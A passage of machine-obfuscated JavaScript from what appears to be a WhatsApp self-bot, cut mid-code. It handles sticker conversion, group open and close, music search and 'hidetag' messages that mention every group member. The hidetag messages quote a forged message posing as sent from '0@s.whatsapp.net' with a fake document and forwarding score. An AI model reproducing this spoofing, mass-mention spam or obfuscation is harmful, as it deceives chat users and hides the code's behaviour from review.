_0x39f25f(_0x4f5501,_0x36bec4-0x1fb,_0x5a4b81-0x32,_0x36bec4-0x18c);}fs[_0x283705(0x974,0xda4,0xdb4,0xa30)](ran);})[_0x39f25f(0xcaa,0x7fa,0xc5e,0xb6e)+_0x39f25f(0x3d1,0x267,0x34b,0x3e3)]([_0x39f25f(0x4df,0x1f0,0x5d3,0x467),_0x1f7707(0x2df,-0xc4,-0x1aa,-0x332),_0x1f7707(-0x328,-0xe0,0x147,-0x151),_0x39f25f(0x504,0x190,-0x12f,0x4f5)+_0x39f25f(0xaed,0x764,0x610,0xc0c)+_0x1f7707(0x3b,-0x2ae,0x1a3,0x9)+_0x39f25f(0x21,0x2c3,-0x1da,0xb1)+_0x1f7707(-0x8a,0x68,0x1ea,0x4ee)+_0x1f7707(0x4c2,0x8d,0xab,0x388)+_0x39f25f(0x28a,0x2bb,0x6c7,0x34a)+_0x1f7707(-0x45,0x428,0x240,0x297)+_0x1f7707(0x654,0x29e,0x3ad,0x4fb)+_0x1f7707(0x186,-0x30a,0x25,-0x32c)+_0x1f7707(0x850,0x999,0x676,0x571)+_0x1f7707(0x44f,0x426,0x33f,0x618)+'[a][b];\x20[a'+']\x20paletteg'+'en=reserve'+_0x1f7707(0x2ac,-0x20e,0xcb,-0x63)+_0x39f25f(-0x1eb,0x1af,0x504,-0x309)+_0x39f25f(0x3cc,0x148,0x34a,0x5a2)+_0x1f7707(0x37,0x467,0x430,0x127)+_0x1f7707(0x393,-0x3a7,0xe1,0x2ff)+'[p]\x20palett'+_0x39f25f(-0x4b,0x164,-0x272,0x5b4)])['toFormat'](_0x39f25f(0x981,0x768,0x332,0x992))[_0x39f25f(0x2b,-0xae,0x1d4,-0x476)](ran);}else{if((isPoto&&mek['message'][_0x1f7707(0x2ef,-0x265,-0x29,-0x4d4)+'ge'][_0x39f25f(0x569,0x671,0x33c,0x440)]<-0x76*-0x4b+0x211*-0x6+-0x1621||isVideo&&mek[_0x39f25f(-0x1d2,-0xdc,0x2e7,-0x34b)][_0x1f7707(0x2c8,0x3ce,0xa3,-0x419)+'sage'][_0x1f7707(0x1c7,0x155,0x52f,0x326)+'o'][_0x1f7707(0x4c3,0x178,0xae,0x381)+_0x39f25f(0xb98,0x7b2,0x3e2,0x8bb)]['videoMessa'+'ge']['seconds']<0x845+-0x71*-0x16+0x8*-0x23e)&&args[_0x39f25f(0x4db,0x67a,0x1f2,0x272)]==-0xc6c+-0x136d+0x1fd9){const encmedia=isVideo?JSON['parse'](JSON['stringify'](mek)[_0x39f25f(0x451,0x3f0,0x7e6,-0x1c)](_0x39f25f(0x3ef,0x79d,0x4e2,0xaa7),'m'))[_0x1f7707(0x127,0x216,-0x28a,0x145)]['stickerMes'+_0x39f25f(-0x355,-0x8d,-0xcf,0x118)][_0x39f25f(0x28a,0x6dd,0x4bc,0x32f)+'o']:mek,media=await alpha['downloadAn'+_0x1f7707(0x4a0,-0x194,0x94,0x25d)+_0x39f25f(-0x1eb,-0x53,-0x331,0x40b)](encmedia);ran=_0x1f7707(0x4a5,0x2d5,0x569,0xd7),reply(lang[_0x1f7707(0x1d0,-0x2be,0x7c,-0x11)]()),await ffmpeg('./'+media)[_0x1f7707(0x85f,0x1f9,0x588,0x4c1)+'t'](media[_0x39f25f(-0xa3,0x3bc,0x430,0x365)]('.')[0x1084+0x3*0xc22+-0x34e9])['on'](_0x1f7707(-0x2bd,-0xb3,0x95,0xe1),function(_0x4ec3f6){function _0x36f981(_0x441794,_0xacf16e,_0x511092,_0x33f142){return _0x39f25f(_0x511092,_0xacf16e- -0x109,_0x511092-0xae,_0x33f142-0x16f);}function _0x25871c(_0xe40fd9,_0x580768,_0x5057e3,_0x1eec11){return _0x39f25f(_0x5057e3,_0xe40fd9- -0x153,_0x5057e3-0x185,_0x1eec11-0x101);}console[_0x36f981(0x8f8,0x496,0x52e,0x7fc)](_0x36f981(0x6ba,0x2ed,0x4d8,-0x2b)+_0x4ec3f6);})['on'](_0x39f25f(-0x4c,-0x6,0x26c,-0x30a),function(_0x5616dd){const _0x1aaa33={'brpkE':'.mp4','KIArt':_0x590fac(0x65d,0x16f,0x82,0x447),'hUOwt':function(_0x1f52bb,_0x547607){return _0x1f52bb(_0x547607);}};console[_0x16ee19(0xa58,0xd6e,0x755,0xba6)](_0x590fac(-0x4,0x7e1,0x7a5,0x37d)+_0x5616dd);function _0x16ee19(_0x596547,_0x5075bd,_0x392c0f,_0x483cb0){return _0x1f7707(_0x596547-0x2c,_0x5075bd,_0x596547-0x667,_0x483cb0-0x1d5);}fs[_0x16ee19(0xcee,0xf4d,0x84e,0xf1e)](media),tipe=media[_0x16ee19(0x69f,0x7d1,0x97a,0x9a7)](_0x1aaa33[_0x590fac(0xb0,0xdb,-0x3d8,-0x148)])?_0x1aaa33[_0x590fac(0x444,0x1ad,0x63b,0x3de)]:_0x590fac(0x222,-0x1c3,0x2ee,0x148);function _0x590fac(_0x221c5e,_0x19258c,_0x44950c,_0x24b1c9){return _0x39f25f(_0x19258c,_0x24b1c9- -0xac,_0x44950c-0x13c,_0x24b1c9-0x76);}_0x1aaa33[_0x16ee19(0x8da,0xba1,0xc9f,0x900)](reply,_0x590fac(-0x40b,-0x550,-0x237,-0x112)+_0x16ee19(0x5c7,0xa45,0x6ff,0x604)+'gkonversi\x20'+tipe+_0x16ee19(0x41f,0x690,0x649,0x1f2));})['on'](_0x39f25f(0x3ef,0x39,0x4e6,0x4e2),function(){function _0x29991a(_0x423465,_0xd6ffd4,_0x559433,_0x1e20aa){return _0x39f25f(_0xd6ffd4,_0x1e20aa-0x201,_0x559433-0x1b3,_0x1e20aa-0x69);}const _0x33e165={};function _0x5e769a(_0x1ff3eb,_0x54890b,_0x2cda71,_0x549fe0){return _0x1f7707(_0x1ff3eb-0xca,_0x549fe0,_0x1ff3eb-0x1cf,_0x549fe0-0x172);}_0x33e165[_0x29991a(-0x20b,-0x25c,0x43a,0x253)]='Finish';const _0x2cd038=_0x33e165;console[_0x29991a(0xbd8,0x66d,0x9ef,0x7a0)](_0x2cd038[_0x29991a(0x3ad,0x441,0x46,0x253)]);const _0x836f06={};_0x836f06[_0x29991a(0x217,0x605,0x458,0x307)]=mek,alpha[_0x29991a(-0xcb,0x3b7,-0x2aa,0x17d)+'e'](from,fs[_0x29991a(0x5a3,0x100,0x18,0x4b5)+'nc'](ran),sticker,_0x836f06),fs[_0x29991a(0x953,0x964,0x6bc,0xa36)](media),fs['unlinkSync'](ran);})[_0x1f7707(0x9bf,0x386,0x64c,0x7ab)+'ptions']([_0x1f7707(0x161,0x23d,0x42,0x38d),_0x1f7707(0x19b,0x2ca,-0x1aa,-0x398),'-vf',_0x39f25f(-0x23d,0x190,0x288,-0x18e)+_0x1f7707(0x84b,0x9c4,0x5b6,0x7cf)+_0x1f7707(0x3cc,0x467,0x1a3,-0x1a5)+_0x1f7707(0x35c,-0x2c9,0x115,0x1a4)+_0x39f25f(0x49d,0x398,-0x10a,-0x125)+_0x39f25f(-0x197,0x259,-0x1ee,0x3ca)+'o=decrease'+_0x39f25f(0x40,0x3ee,0x1ef,0x857)+_0x39f25f(0x3df,0x55b,0x545,0x621)+_0x39f25f(0x38f,0x1d3,0x4f1,0x4)+'or=white@0'+'.0,\x20split\x20'+'[a][b];\x20[a'+_0x39f25f(0x210,0x5a3,0x416,0x692)+'en=reserve'+'_transpare'+_0x1f7707(0x431,0x2de,0x1,0x34c)+'sparency_c'+_0x1f7707(0x45f,0x8d2,0x430,0x663)+_0x39f25f(0x41e,0x28f,0x1be,0x2ed)+_0x1f7707(0x38f,-0xae,0x362,0xc3)+_0x39f25f(-0x289,0x164,0x573,0x3d0)])[_0x1f7707(-0x20a,-0x32a,-0xf0,-0x8)](_0x1f7707(0x694,0x31f,0x5ba,0x53c))[_0x39f25f(-0x445,-0xae,-0x23d,-0x2d8)](ran);}else fakegroup(_0x1f7707(-0x14a,0x203,0x2e5,0x8f)+'ar\x20dengan\x20'+'caption\x20'+prefix+_0x39f25f(-0x118,0x9f,0x58,0x457)+enter+(_0x39f25f(0x4d0,0x3b2,0x20c,0x6fe)+_0x1f7707(-0x58,0x55,-0x144,0x1a0)+_0x39f25f(0x42a,0x7a7,0x656,0x575)));}}}if(stc){if(stc[_0x1f7707(0x227,0x59a,0x30e,0x147)]==''+cmd_stc_to_image){console[_0x39f25f(0x46b,0x59f,0x3d8,0xa3f)](color(time,_0x39f25f(0xad8,0x6e1,0x7b6,0x62b)),color(moment['tz'](_0x1f7707(0x55e,0x365,0x56c,0x132)+'ta')['format']('HH:mm:ss'),_0x39f25f(0x49c,0x5bf,0xa6b,0x9c1)),color('STC\x20CMD\x20ST'+_0x1f7707(-0x39d,-0x4fc,-0x2c1,-0x26d)+_0x39f25f(-0x1d2,0xcb,-0x3bb,-0x6d)));const isStikerl=type===_0x39f25f(-0x1a1,0x251,0xc2,-0x7)+_0x1f7707(-0x62f,-0xd6,-0x23b,0x9)&&content[_0x1f7707(0x791,0x4d0,0x39f,0x1ec)](_0x1f7707(0x4c8,-0x10a,0xa3,0x1f4)+_0x39f25f(-0x4d4,-0x8d,-0x91,0x265));if(!isStikerl)return fakeitem('Reply\x20atau'+_0x1f7707(0x5c2,0x6c6,0x698,0xb43)+_0x39f25f(0x42d,0x2e8,0x2dc,0x1a6)+'!');reply(lang[_0x1f7707(-0x1c1,0x113,0x7c,-0x27b)]()),encmedia=JSON[_0x1f7707(0x404,0x17e,0x432,-0x5e)](JSON['stringify'](mek)[_0x39f25f(0x7d8,0x3f0,0x72a,0x1a0)]('quotedM','m'))['message']['stickerMes'+_0x39f25f(0x424,-0x8d,0x7c,-0xb0)][_0x39f25f(0x48f,0x6dd,0x9b5,0x9fd)+'o'],media=await alpha[_0x1f7707(0x382,0x565,0x2ac,0xd)+'dSaveMedia'+'Message'](encmedia),ran=getRandom(_0x1f7707(-0x2d2,-0x4d3,-0x289,-0x256)),exec(_0x1f7707(0x33f,-0x8b,0x200,0xdb)+media+'\x20'+ran,_0x573318=>{function _0x1385c4(_0x376456,_0x2b99f0,_0x4bcf2b,_0x1b2951){return _0x1f7707(_0x376456-0x6c,_0x4bcf2b,_0x2b99f0-0x53,_0x1b2951-0x45);}const _0x2e71dd={'qjEUo':'1|3|0|4|2','XONSZ':function(_0x1e1c8c,_0x4b4343){return _0x1e1c8c(_0x4b4343);},'enFtG':_0x7ecff8(0x78a,0x8ee,0x6ec,0x951)+_0x7ecff8(0xb17,0xd02,0x9f8,0x9cb)+'gi\x20^_^','TtquH':function(_0xd5d86f,_0x189474,_0x3b425b){return _0xd5d86f(_0x189474,_0x3b425b);},'UONpj':_0x1385c4(0x390,0x62c,0x59c,0x255)+_0x7ecff8(0x490,0x387,0x75f,0xb99)};function _0x7ecff8(_0x33893d,_0xa73020,_0x551bc8,_0x3c7c40){return _0x39f25f(_0x3c7c40,_0x551bc8-0x4ce,_0x551bc8-0x180,_0x3c7c40-0x198);}const _0x4ef728=_0x2e71dd['qjEUo']['split']('|');let _0x3e4dfd=0x11c5+-0x1*-0xdd3+-0x1f98;while(!![]){switch(_0x4ef728[_0x3e4dfd++]){case'0':buffer=fs['readFileSy'+'nc'](ran);continue;case'1':fs[_0x1385c4(0x85f,0x6da,0xb3a,0xa67)](media);continue;case'2':fs[_0x1385c4(0x242,0x6da,0x842,0x6b4)](ran);continue;case'3':if(_0x573318)return _0x2e71dd['XONSZ'](reply,_0x2e71dd['enFtG']);continue;case'4':_0x2e71dd['TtquH'](fakethumb,buffer,_0x2e71dd['UONpj']);continue;}break;}});}}if(stc){if(stc['fileLength']==0x1*0x417+0x3667+-0x2*0xe7f){var value=_0x39f25f(0xa86,0x74b,0x8dd,0x588)+_0x1f7707(-0xce,-0x56f,-0x17f,-0x18d)+'\x20'+enter+enter+'\x20';value+=enter+(_0x1f7707(0x1a1,-0x178,0xf4,0x255)+_0x1f7707(-0x71d,0x4a,-0x2d9,-0x6d9)+_0x1f7707(-0xd2,0x310,0xd2,0x9c)+_0x1f7707(-0x6,0x56b,0x1bb,-0x3)+_0x39f25f(0x82c,0x466,0x1da,0x63a)+_0x1f7707(0x1f2,-0x64,-0x246,-0x294))+enter+enter,value+=enter+(_0x1f7707(-0x10b,-0x28f,-0x122,0xc6)+_0x1f7707(0x2ec,-0xcd,0x29f,0x57f))+enter+enter,value+=enter+_0x1f7707(-0x420,-0x341,-0xec,0x7e);var group=await alpha[_0x1f7707(0x3cf,0x2c1,0x8c,0x192)+_0x1f7707(0x50a,0x62b,0x51e,0x49a)](from),member=group[_0x39f25f(0x51e,0x2c9,0x3f8,0x13e)+'ts'],mem=[];member[_0x1f7707(0xfc,-0x318,-0x1d1,-0x15c)](async _0x53002d=>{const _0x42ee89={};function _0x53f0fc(_0x3953b9,_0x3d2fc8,_0x6fe959,_0x23d956){return _0x39f25f(_0x3953b9,_0x6fe959-0x584,_0x6fe959-0x51,_0x23d956-0xfc);}_0x42ee89[_0x53f0fc(0xf10,0x8e0,0xcb1,0xe05)]=_0x53f0fc(0x878,0x935,0x8b6,0x563)+_0x53f0fc(0xab5,0x99f,0xb83,0x8c1);function _0x175986(_0x47060d,_0x3af681,_0x23382e,_0x45da7a){return _0x39f25f(_0x3af681,_0x47060d-0x413,_0x23382e-0x1e3,_0x45da7a-0x1ab);}const _0x32dcce=_0x42ee89;mem[_0x53f0fc(0xc26,0xa7b,0x9dc,0x980)](_0x53002d['id']['replace'](_0x53f0fc(0xb7a,0xb37,0x9c4,0x7ba),_0x32dcce[_0x53f0fc(0xde6,0xb06,0xcb1,0xe51)]));});const _0xc1d32f={};_0xc1d32f['mentionedJ'+'id']=mem;const _0x53eb3c={};_0x53eb3c['text']=value,_0x53eb3c['contextInf'+'o']=_0xc1d32f,_0x53eb3c[_0x1f7707(-0x34d,0x2f8,-0xa8,-0x2d1)]=mek;var optionshidetag=_0x53eb3c;const _0x49e4a0={};_0x49e4a0[_0x1f7707(-0x33b,-0xa4,0x11b,0x51b)+'t']='0@s.whatsa'+_0x39f25f(0x9e5,0x74e,0xad3,0x825),_0x49e4a0[_0x39f25f(0x302,0x3d9,0x738,0x378)]='6283136505'+_0x1f7707(0x365,-0x247,0xf8,-0xbb)+_0x39f25f(0x1fe,-0x2,0x1b2,-0x92),_0x49e4a0[_0x39f25f(0x330,0x4be,0x433,0x76b)]=![],_0x49e4a0['id']=_0x1f7707(0x4f2,0x1f3,0x529,0x47e)+_0x1f7707(-0x2f6,-0xb7,0x121,-0xb4)+_0x1f7707(0x704,0x2c6,0x675,0x351)+'4A';const _0x1338da={};_0x1338da['forwarding'+_0x1f7707(0x2cc,0x252,0x0,0x30f)]=0x3e7,_0x1338da['isForwarde'+'d']=!![],alpha['sendMessag'+'e'](from,optionshidetag,text,{'quoted':{'key':_0x49e4a0,'message':{'documentMessage':{'jpegThumbnail':fs[_0x1f7707(-0x2a0,0x33a,0x106,0x2a2)+'nc'](_0x39f25f(0x3eb,0xef,-0x270,0x6b)+thumbnail),'mimetype':_0x1f7707(0x398,0x4d1,0x24b,-0x7e)+_0x1f7707(0x34b,0x7c3,0x414,0x58a)+_0x1f7707(0x456,-0x3e5,0x8,-0x33a),'title':''+setting[_0x1f7707(0x66c,0x706,0x258,0x81)],'fileLength':'36','pageCount':0x0,'fileName':setting['fake']+'\x20'}},'messageTimestamp':'1614069378','status':_0x1f7707(-0x39b,-0x3d9,0xcf,0x58)},'contextInfo':_0x1338da});}}if(stc){if(stc[_0x1f7707(0xb9,0x448,0x30e,0x5e3)]==-0x1*0x245+0x6f63+0x6d4*0x3){var value=_0x39f25f(0x558,0x223,0x8d,0x546)+_0x1f7707(-0x2a8,-0x2a,-0x290,-0x2ed)+'*'+enter+enter;value+=_0x39f25f(0x1c3,0x2a2,0x2b5,0x510)+_0x39f25f(-0x24,-0x12b,-0xc5,0x2c7)+_0x39f25f(0x274,0x6f7,0x26b,0x2e3)+'U7WJE'+enter+enter,value+='Sc\x20*SELF-B'+_0x39f25f(0x26b,0x4e1,0x833,0x8d0)+enter,value+='\x0a';var group=await alpha[_0x1f7707(0x38b,0x4b5,0x8c,0x272)+_0x1f7707(0x4fe,0x7f5,0x51e,0x36a)](from),member=group[_0x39f25f(0x385,0x2c9,-0x13a,0x432)+'ts'],mem=[];member[_0x39f25f(0x148,-0x23,0x81,0x394)](async _0x535003=>{function _0x5ab35b(_0xcbb8e3,_0x6a1d40,_0xa3ef65,_0x4fc4d5){return _0x1f7707(_0xcbb8e3-0x55,_0xa3ef65,_0x6a1d40-0x583,_0x4fc4d5-0xb6);}const _0x551366={};function _0xdba58a(_0xafd10f,_0x42c9fb,_0x2cf718,_0x285038){return _0x1f7707(_0xafd10f-0x188,_0x42c9fb,_0xafd10f-0xcd,_0x285038-0x157);}_0x551366[_0xdba58a(-0x151,-0x547,0x20b,0x151)]=_0xdba58a(0x35f,0x1e4,0x774,0x36f),_0x551366[_0xdba58a(-0x47,-0x85,0x313,0x283)]='s.whatsapp'+_0x5ab35b(0xde7,0x9d4,0xe92,0x6ee);const _0x1d8755=_0x551366;mem[_0x5ab35b(0xa54,0x82d,0x716,0xbd5)](_0x535003['id']['replace'](_0x1d8755[_0x5ab35b(0x22b,0x365,0x45f,0x6b9)],_0x1d8755[_0xdba58a(-0x47,-0x331,0x3e9,-0x1bc)]));});const _0x5f17ca={};_0x5f17ca[_0x1f7707(0x1c8,0x1f6,0x491,0x3bd)+'id']=mem;const _0x4254fa={};_0x4254fa[_0x39f25f(0x523,0x3cc,0x523,0x775)]=value,_0x4254fa[_0x1f7707(0x98f,0x8da,0x52f,0x43a)+'o']=_0x5f17ca,_0x4254fa['quoted']=mek;var optionshidetag=_0x4254fa;const _0x45ddea={};_0x45ddea[_0x39f25f(0x297,0x2c9,0x588,0x55f)+'t']=_0x1f7707(-0x3fa,-0x11d,-0x8d,0x28b)+_0x1f7707(0x569,0x370,0x5a0,0x7b6),_0x45ddea[_0x39f25f(0x866,0x3d9,0x186,0x20b)]=_0x39f25f(0xa81,0x75d,0x9bf,0x6a2)+_0x1f7707(0x447,0x212,0xf8,0x2b2)+_0x1f7707(-0x4ba,-0x2b1,-0x1b0,0x1cf),_0x45ddea['fromMe']=![],_0x45ddea['id']='B391837A58'+_0x1f7707(0x39f,-0x2a6,0x121,0x94)+_0x1f7707(0xad0,0x4b4,0x675,0x7e8)+'4A';const _0x29dd8d={};_0x29dd8d[_0x39f25f(0x201,0x6ba,0xa49,0x5a5)+_0x1f7707(-0x17f,-0xbc,0x0,-0x307)]=0x3e7,_0x29dd8d[_0x1f7707(0x22c,-0x189,-0x151,0x17)+'d']=!![],alpha[_0x1f7707(-0x2c0,-0x3d5,-0x232,-0x34)+'e'](from,optionshidetag,text,{'quoted':{'key':_0x45ddea,'message':{'documentMessage':{'jpegThumbnail':fs[_0x1f7707(-0x7d,-0x319,0x106,0x3e8)+'nc']('image/'+thumbnail),'mimetype':_0x39f25f(0x336,0x3f9,0x2f2,0x5d6)+'n/octet-st'+_0x1f7707(-0x40b,-0x215,0x8,0x3f3),'title':''+setting[_0x39f25f(0x459,0x406,0x310,0x51a)],'fileLength':'36','pageCount':0x0,'fileName':setting[_0x1f7707(0x8f,0x593,0x258,0x46c)]+'\x20'}},'messageTimestamp':_0x1f7707(-0x94,0x241,0x410,0x99),'status':_0x39f25f(0x466,0x27d,0x384,-0x5a)},'contextInfo':_0x29dd8d});}}if(stc){if(stc[_0x39f25f(0x2c3,0x4bc,0x392,0x3a8)]==''+cmd_stc_group_open){console[_0x39f25f(0x94f,0x59f,0x405,0x499)](color(time,_0x39f25f(0xb7a,0x6e1,0x6ae,0xb18)),color(moment['tz'](_0x1f7707(0x965,0x84d,0x56c,0x531)+'ta')['format'](_0x1f7707(0x5bd,0x544,0x18b,0x3b)),_0x39f25f(0x83a,0x5bf,0x2af,0x71d)),color('STC\x20CMD\x20GR'+_0x1f7707(0x753,0x46,0x4d3,0xba)));if(!isBotGroupAdmins)return reply(_0x39f25f(0x202,0x590,0x742,0x9b8)+_0x39f25f(0x53,-0x128,-0xba,0x280)+_0x1f7707(0x154,0x282,0x464,0x300)+'erlebih\x20da'+'hulu```');await alpha[_0x1f7707(0x52b,-0x29c,0x13c,-0xe8)+_0x39f25f(0x2d2,0xe,-0x93,-0x16)](from,GroupSettingChange[_0x39f25f(0x255,0x499,0x4eb,-0x5)+'d'],![]),fakegroup(_0x39f25f(0x6e4,0x467,0xbc,-0xf)+_0x1f7707(-0x36f,0x171,-0x1fd,-0x171)+_0x39f25f(0x1cf,0x281,0x1ff,-0x201)+'``');}else stc[_0x39f25f(0x62b,0x4bc,0x139,0x5c3)]==''+cmd_stc_group_close&&(console[_0x39f25f(0x205,0x59f,0x685,0x394)](color(time,_0x39f25f(0x3c9,0x6e1,0x847,0xa88)),color(moment['tz']('Asia/Jakar'+'ta')[_0x39f25f(0x43,0x2e1,0x44c,0xdd)](_0x39f25f(0x5e3,0x339,0x51f,0xec)),_0x1f7707(-0x3e,0x4bb,0x411,0x2ad)),color('STC\x20CMD\x20GR'+'OUP\x20CLOSE\x20')),await alpha[_0x1f7707(-0x2bb,0x1,0x13c,-0x90)+'ngChange'](from,GroupSettingChange[_0x1f7707(0x4ed,0x44,0x2eb,0x6fd)+'d'],!![]),fakegroup('```SUCCESS'+_0x39f25f(0x693,0x37f,0x62b,0x3c2)+'G\x20GROUP```'));}if(stc){if(stc[_0x1f7707(0x64d,0xf5,0x30e,0x66f)]==''+cmd_stc_play_music){console[_0x1f7707(-0xb7,0x735,0x3f1,0x474)](color(time,_0x1f7707(0xcd,0x579,0x533,0x888)),color(moment['tz'](_0x39f25f(0x807,0x71a,0x3a5,0x7eb)+'ta')[_0x39f25f(0x567,0x2e1,0x50a,0x4a0)](_0x39f25f(0x443,0x339,-0x8c,0x2f)),_0x1f7707(0x2ce,0x4f3,0x411,0x136)),color(_0x39f25f(0x4bb,0x726,0x850,0x976)+_0x1f7707(0x3b6,0x352,0x4ef,0x28d))),fakegroup(_0x1f7707(0x371,0x462,0x9b,0x33e)+'ng\x20Song...'+_0x1f7707(0x2b2,0x171,0x4d0,0x52a)),aramas=await yts(srchh),aramat=aramas[_0x1f7707(0x6ec,0x837,0x699,0x373)];var mulaikah=aramat[0xab7+0xc3b+-0x16f2]['url'];try{yta(mulaikah)[_0x39f25f(0x89d,0x3e2,-0xa7,0x2d2)](_0x186354=>{function _0x3f6a20(_0x2b2d8a,_0x4af04f,_0x5d9c06,_0x467b71){return _0x1f7707(_0x2b2d8a-0x109,_0x5d9c06,_0x467b71-0x105,_0x467b71-0x54);}const _0x27b245={'ETfmc':function(_0x5cd5c6,_0x2d7f17){return _0x5cd5c6>=_0x2d7f17;},'FoQLV':'Emror','zigiy':_0x5e8491(0x3d2,0x302,0x68c,0x747),'ZCdXb':function(_0x133588,_0x12ceee){return _0x133588>=_0x12ceee;},'hoToo':function(_0x1b17b2,_0x348509){return _0x1b17b2(_0x348509);},'jHQxw':function(_0x4c1734,_0x2cb26f,_0x19297d,_0x151195){return _0x4c1734(_0x2cb26f,_0x19297d,_0x151195);},'uKELT':function(_0x56ad59,_0x413c0f,_0x5ebf2f,_0x11df5e){return _0x56ad59(_0x413c0f,_0x5ebf2f,_0x11df5e);},'ywjmx':function(_0x2ca9db,_0x27f9c6,_0x2b4bde){return _0x2ca9db(_0x27f9c6,_0x2b4bde);}},{dl_link:_0x2fa8f6,thumb:_0x1ad5cb,title:_0x110201,filesizeF:_0x55008b,filesize:_0x6b4c76}=_0x186354;function _0x5e8491(_0x64e54a,_0x510e0d,_0x160bd7,_0x8397ec){return _0x1f7707(_0x64e54a-0x19a,_0x510e0d,_0x64e54a-0x0,_0x8397ec-0x6d);}axios[_0x5e8491(0xda,-0x24e,0x50c,-0x2bd)]('https://ti'+_0x3f6a20(0x4bd,-0x82,0x2ab,0x184)+_0x5e8491(0x2a2,0x68f,0x2cb,-0x143)+'.php?url='+_0x2fa8f6)[_0x5e8491(0x234,0x674,0x15b,0x280)](async _0x5660c7=>{const _0x33e37f={'KYNIW':function(_0x16ffac,_0x4af7fa){function _0x56bf81(_0x5e4864,_0x3abd6d,_0x161fb1,_0x343173){return _0x3a08(_0x161fb1-0x1c3,_0x343173);}return _0x27b245[_0x56bf81(0x847,0xaff,0x8ce,0x638)](_0x16ffac,_0x4af7fa);},'kIKmF':function(_0x5d40b4,_0x366afd){return _0x5d40b4(_0x366afd);},'rPYHr':function(_0x256db4,_0x22c274,_0x274ba6,_0x11ffd7){return _0x256db4(_0x22c274,_0x274ba6,_0x11ffd7);},'pgDko':_0x27b245[_0xf24140(0x662,0x5da,0x531,0x949)]};function _0x38affb(_0x3a4a3b,_0x409ea5,_0x4bf49a,_0x3081ce){return _0x3f6a20(_0x3a4a3b-0xb8,_0x409ea5-0x169,_0x3a4a3b,_0x409ea5-0x37c);}function _0xf24140(_0x2e24ad,_0x5e787f,_0x979ecf,_0x52c1a8){return _0x5e8491(_0x52c1a8-0x44b,_0x979ecf,_0x979ecf-0x8,_0x52c1a8-0x1f0);}if(_0x27b245[_0x38affb(0x9c3,0x75a,0x863,0x518)]===_0x27b245[_0xf24140(0x6d0,0xb4c,0x8ef,0x724)]){if(_0x27b245[_0xf24140(0x40b,0x643,-0x1b7,0x22a)](_0x27b245[_0xf24140(0x4ae,0x3e7,-0x132,0x389)](Number,_0x6b4c76),-0x9*0x2689+0x189b*0x1d+-0x1*-0x17e2))return _0x27b245[_0x38affb(0x497,0x2bc,0x496,-0x193)](sendMediaURL,from,_0x1ad5cb,'*PLAY\x20MUSI'+'C*'+enter+enter+_0x38affb(0xa43,0x5a0,0x4dc,0x400)+_0x110201+enter+(_0x38affb(0xe0d,0xb1e,0xf16,0x93a)+'3')+enter+(_0xf24140(0x218,0x26b,0x138,0x44d)+_0xf24140(0x516,0xb01,0xce4,0x8f1))+_0x55008b+enter+'*Link*\x20:\x20'+_0x5660c7[_0x38affb(0x492,0x7e6,0x495,0x4aa)]+enter+enter+('_Untuk\x20dur'+_0xf24140(0xe04,0x558,0x719,0xa00)+_0xf24140(0x816,0x936,0x8d2,0xa80)+_0x38affb(0x475,0x462,0x4fb,0x40c)+_0x38affb(0x82c,0x864,0x688,0x3d9)+_0x38affb(0x9b6,0x92f,0x933,0x7bc)));const _0x220d59=_0xf24140(0x88a,0x6f4,0x33d,0x568)+'C*'+enter+enter+_0xf24140(0x644,0x875,0x127,0x56a)+_0x110201+enter+('*Ext*\x20:\x20MP'+'3')+enter+_0xf24140(-0x201,-0xa2,-0x2a9,0x1cf)+_0x55008b+enter+_0xf24140(0x83b,0x611,0x925,0xab5)+_0x5660c7['data']+enter+enter+(_0xf24140(0x7db,0xa5d,0xf66,0xadc)+'tunggu\x20fil'+_0xf24140(0xa9e,0x852,0x681,0x617)+_0xf24140(-0x1bd,-0xb,0x40e,0x1df)+_0xf24140(0x83e,0x16e,0x2d2,0x5dd)+'\x20butuh\x20beb'+_0x38affb(0x632,0x2aa,-0x165,0x56b)+'t_');_0x27b245[_0x38affb(0x718,0x9ad,0x97d,0xd8e)](sendMediaURL,from,_0x1ad5cb,_0x220d59),await _0x27b245[_0x38affb(0x2b3,0x4cd,0x3b6,0x919)](sendMediaURL,from,_0x2fa8f6)[_0xf24140(0x90f,0x577,0x647,0x996)](()=>reply(_0x38affb(0x748,0x2cd,0x203,0x4b6)));}else{const _0x54fd24={'cIxWM':function(_0x4bf2e5,_0x49a5ad){return _0x4bf2e5(_0x49a5ad);},'BzrpM':_0x33e37f[_0x38affb(0x190,0x315,0xef,0x51f)]},{dl_link:_0x5c7750,thumb:_0x127b39,title:_0x2f7b4e,filesizeF:_0x33e7dd,filesize:_0x17d40a}=_0x57dd1d;_0x439381[_0xf24140(0x15f,0x6fd,0xb2,0x525)](_0xf24140(0x46b,0x795,0x609,0x69b)+'nyurl.com/'+_0x38affb(0x609,0x723,0xa61,0x411)+'.php?url='+_0x5c7750)['then'](async _0x45346e=>{function _0x56fc15(_0x9325d2,_0x426aa6,_0x38ac15,_0x47d190){return _0x38affb(_0x38ac15,_0x47d190- -0x5e,_0x38ac15-0x58,_0x47d190-0x17a);}function _0x1d72ad(_0x3125db,_0x5ab53f,_0x389236,_0x4e91f0){return _0x38affb(_0x3125db,_0x389236- -0x54,_0x389236-0x3b,_0x4e91f0-0x1ce);}if(_0x33e37f[_0x1d72ad(0xacf,0x570,0x763,0x63a)](_0x33e37f[_0x1d72ad(0x869,0x49c,0x62b,0x5d9)](_0x3e9d83,_0x17d40a),0xb649+-0xd131+0x9018))return _0x33e37f[_0x56fc15(0x3f3,0x7b7,0x714,0x390)](_0x4095be,_0x3b4adc,_0x127b39,_0x56fc15(0x212,0x861,0x831,0x4b1)+_0x1d72ad(0x7e4,0x629,0x5cd,0x96f)+_0x1d72ad(0xb92,0x79d,0xa85,0x8e6)+_0x2f7b4e+(_0x1d72ad(0x43f,0x3d6,0x258,-0x1d)+_0x56fc15(0xac7,0xf07,0x7bc,0xaa9))+_0x57b057[_0x56fc15(0x67a,0xdb6,0x881,0x998)][-0x1fda+0x81+0x217*0xf][_0x56fc15(0x81c,0xbb3,0x744,0xa09)]+(_0x1d72ad(0x9f2,0x82b,0xaa5,0xa8f)+':\x20')+_0x4575ba['videos'][-0x8a1*0x2+0x1aff+-0x9bd][_0x1d72ad(0xa9b,0xc2e,0x844,0x728)]+(_0x1d72ad(0x794,0x7dc,0x410,0x5d5)+'\x20')+_0x33e7dd+'\x0a🍃\x20Views:\x20'+_0x5ce5ac['videos'][-0x12c*0xb+0x2273+-0x1*0x158f][_0x1d72ad(0xd10,0xb89,0x865,0x883)]+(_0x1d72ad(0x514,0x366,0x2a0,0x61e)+_0x1d72ad(0x706,0xa79,0x7a0,